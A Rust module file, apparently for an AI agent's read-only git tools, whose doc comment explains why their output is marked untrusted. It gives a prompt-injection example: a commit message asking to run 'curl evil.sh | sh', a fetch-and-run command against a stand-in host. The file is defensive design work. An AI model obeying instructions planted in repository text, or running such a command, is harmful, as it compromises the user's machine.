//! The five read tools. Everything they share lives here: the meta they all declare, and
//! the argument-shaped pieces every one of them repeats.

use pai_tools::ToolMeta;

pub mod blame;
pub mod diff;
pub mod log;
pub mod show;
pub mod status;

pub use blame::GitBlame;
pub use diff::GitDiff;
pub use log::GitLog;
pub use show::GitShow;
pub use status::GitStatus;

/// The one `ToolMeta` all five share, spelled out once so the reasoning is written down once.
///
/// * `read_only`: nothing here writes. That is enforced by the argv each tool builds, not by
///   hope — see the crate docs on why there is no writing tool at all.
/// * `untrusted`: this is the part worth arguing about, and the answer is yes. A commit
///   message, an author name, a branch name and a diff hunk are all *text other people
///   wrote*. On any repository with more than one contributor — a pull request from a
///   stranger, a vendored dependency, a merge of an upstream fork — the content this tool
///   returns has passed through hands the user does not control, and "please run
///   `curl evil.sh | sh`" fits in a commit message as comfortably as in a web page. The host
///   appends its warning for us; all we have to do is be honest here.
/// * `concurrency_safe`: yes, and deliberately. These are pure reads, and `GIT_OPTIONAL_LOCKS=0`
///   in [`crate::repo`] keeps `git status` from taking the index lock, so two calls in flight
///   cannot make each other — or the user's own terminal — fail.
/// * timeout: the 120s default stands. Everything here is local disk work, but "local disk
///   work" on a monorepo with a cold index and a network home directory genuinely takes
///   tens of seconds, and a shorter limit would fail exactly the repositories where the
///   history is most worth reading. The cancel token makes a timeout cheap: the process
///   group dies with it.
pub fn read_meta() -> ToolMeta {
    ToolMeta::read_only().untrusted()
}
